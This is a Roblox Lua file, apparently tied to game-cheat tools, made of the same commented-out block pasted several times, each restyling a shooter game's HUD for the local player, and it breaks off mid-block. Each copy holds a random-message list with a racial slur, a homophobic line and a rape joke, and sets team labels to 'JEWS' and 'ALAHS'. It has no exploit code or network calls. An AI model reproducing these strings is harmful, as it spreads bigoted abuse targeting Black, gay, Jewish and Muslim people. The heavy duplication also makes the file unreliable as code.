	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]


























--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
